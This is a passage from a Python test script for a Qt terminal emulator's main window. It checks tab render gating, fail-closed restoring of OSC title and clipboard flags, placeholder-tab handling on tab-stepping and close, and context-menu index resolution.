ok(all((_p37t._render_active is (_p37t is _p37cur)) for _p37t in _p37terms),
   'sweep: exactly the current tab is render-active, the rest gated')
_p37oi = next(_p37i for _p37i in range(_p37w.tabs.count())
              if _p37w.tabs.widget(_p37i) is not _p37cur and isinstance(_p37w.tabs.widget(_p37i), _p37ST))
_p37w.tabs.setCurrentIndex(_p37oi); APP.processEvents()
_p37nc = _p37w.tabs.currentWidget()
ok(_p37nc is not _p37cur and _p37nc._render_active is True and _p37cur._render_active is False,
   'sweep: switching moves the active flag to the newly-current tab')
_p37w.close(); _p37w.deleteLater(); APP.processEvents()



# --- security cycle: SEC-10 (set_allow_title OSC-default desync) ---------------
_p10w = _p37MW()
_p10w.new_tab(); APP.processEvents()
_p10w.set_allow_title(False)
ok(_p10w._osc_defaults.get('osc_title') is False and _p10w._osc_defaults.get('osc_notify') is False,
   'SEC-10: set_allow_title(False) syncs osc_title/osc_notify defaults off for NEW tabs')
_p10w.set_allow_title(True)
ok(_p10w._osc_defaults.get('osc_title') is True and _p10w._osc_defaults.get('osc_notify') is True,
   'SEC-10: set_allow_title(True) re-enables the OSC defaults')
_p10w.close(); _p10w.deleteLater(); APP.processEvents()

# OSC-map fail-CLOSED restore (SEC follow-up): a tampered granular OSC flag
# ("off"/"false"/0 -> truthy via bool()) must NOT re-enable a risk='high' OSC-52
# clipboard feature the saved value says is disabled. _saved_bool coerces a non-bool
# to the feature's secure default. Run LAST (a throwaway window + its probe tab must
# not perturb the ctl-dump-tab COR-7 fixture above).
_oscw = MainWindow()
_oscw._locked = set()
_oscw._restore_tab({'osc': {'osc_clipboard_read': 'off', 'osc_clipboard': 'false'}})
_oscw_tab = _oscw.current()
ok(not _oscw_tab.osc_enabled('osc_clipboard_read')
   and not _oscw_tab.osc_enabled('osc_clipboard'),
   'SEC: a tampered non-bool OSC flag stays disabled on restore, not bool()-coerced open')
_oscw.close(); _oscw.deleteLater(); APP.processEvents()

# claude: _restore_tab's `colors` must default ON like its sibling settings
# (line_edits, markings), not OFF -- a session with no 'colors' key should restore
# colors ON, not the old _saved_bool(info.get('colors'), False) default.
_cw2 = MainWindow(); _cw2._locked = set()
_cw2._restore_tab({'text': ''})          # no 'colors' key
ok(_cw2.current().colors_enabled(),
   'claude: colors defaults ON on restore when unset (consistent with line_edits/markings)')
_cw2.close(); _cw2.deleteLater(); APP.processEvents()

# grok: _on_tab_step must SKIP a disabled restore placeholder and keep walking
# (wrapping) to the next real tab, not dead-end on it -- a single `if enabled` did.
# Indices are computed from count() (a fresh MainWindow already owns one live tab).
_stw = MainWindow()
_stw._add_placeholder_tab({'name': 'ph', 'cwd': '/tmp'}, _stw.tabs.count())  # nosec B108 (inert cwd string) -- placeholder LAST
_stw_phi = _stw.tabs.count() - 1
_stw.tabs.setCurrentIndex(_stw_phi - 1)   # the last live tab, just before the placeholder
_stw._on_tab_step(1)                      # PageDown: -> ph (skip) -> wrap -> live 0
ok(_stw.tabs.currentIndex() == 0,
   'grok: tab-step skips a disabled placeholder and wraps to the next live tab')
_stw.tabs.removeTab(_stw_phi)             # drop the orphan before close (closeEvent covered below)
_stw.close(); _stw.deleteLater(); APP.processEvents()

# claude: closeEvent + _session_tabs iterate REAL terminals only -- a restore
# placeholder that survives the deferred-restore drain (an unknown placeholder is a
# safe swap no-op) must never reach has_foreground_program/shutdown/toPlainText, which a
# bare QWidget lacks. Pre-fix those bulk-over-all-tabs loops abort the process on it.
# Direct closeEvent(QCloseEvent()) so a pre-fix AttributeError is a catchable failure
# here, not the uncatchable Qt-dispatch abort that .close() would raise.
_clw = MainWindow(); _clw._locked = set()
_clw_real = len(_clw._real_terms())                            # the live tab(s) a fresh window owns
_clw._add_placeholder_tab({'name': 'ph', 'cwd': '/tmp'}, _clw.tabs.count())  # nosec B108 (inert cwd string) -- append 1 placeholder
ok(len(_clw._session_tabs()) == _clw_real
   and _clw.tabs.count() == _clw_real + 1,
   'claude: _session_tabs skips a surviving restore placeholder (real tabs only)')
_clw._persist_session = False                                  # do not write a session file
_clw_err = None
try:
    _clw.closeEvent(QCloseEvent())                             # must not touch the placeholder
except Exception as _e:
    _clw_err = _e
ok(_clw_err is None,
   'claude: closeEvent tolerates a surviving restore placeholder (no AttributeError abort)')
_clw.deleteLater(); APP.processEvents()

# claude(#2): a tab context-menu action must resolve its tab's CURRENT index when it
# FIRES, not the index captured at build time -- menu.exec spins a nested loop during
# which the tabs can shift (a background tab closes, or here a placeholder is inserted
# before the subject), so a captured index would act on the WRONG tab. Shift the subject
# inside exec, then trigger Rename and assert it targeted the subject's new index.
_c2w = MainWindow()
_c2w.new_tab(); _c2w.new_tab()                        # >= 3 tabs
_c2_term = _c2w.tabs.widget(_c2w.tabs.count() - 1)    # the menu's subject tab (last)
_c2_idx0 = _c2w.tabs.indexOf(_c2_term)
_c2_seen = []
_c2w.rename_tab = lambda i: _c2_seen.append(i)        # record the index the action passes
_c2_ome = QMenu.exec
def _c2_exec(_menu, *_a, **_k):
    _c2w._add_placeholder_tab({'name': 'x', 'cwd': '/tmp'}, 0)  # nosec B108 (inert cwd string) -- insert before subject -> +1
    for _act in _menu.actions():
        if _act.text().startswith('Rename'):
            _act.trigger()
            break
    return None
QMenu.exec = _c2_exec
try:
    _c2w._tab_context_menu(_c2w.tabs.tabBar().tabRect(_c2_idx0).center())
finally:
    QMenu.exec = _c2_ome
ok(_c2w.tabs.indexOf(_c2_term) == _c2_idx0 + 1 and _c2_seen == [_c2_idx0 + 1],
   'claude(#2): a context-menu action targets its tab by current index after a reorder')
_c2w.close(); _c2w.deleteLater(); APP.processEvents()


win.close()
win.deleteLater()
APP.processEvents()

print('secure-terminal-tests(mainwin): all passed' if not _failures else
      'secure-terminal-tests(mainwin): %d failed' % _failures)
# Flush before exit; the offscreen Qt platform can crash in its static teardown
# after a clean run, which would mask an otherwise-passing result -- so exit hard
# once the result is known and printed (all real work is already done). os._exit
# skips atexit, so persist coverage data explicitly first (a no-op otherwise).
try:
    import coverage
    _cov = coverage.Coverage.current()
    if _cov is not None:
        _cov.save()
except Exception:
    pass                    # coverage is optional instrumentation, never fatal
sys.stdout.flush()
sys.stderr.flush()
os._exit(1 if _failures else 0)
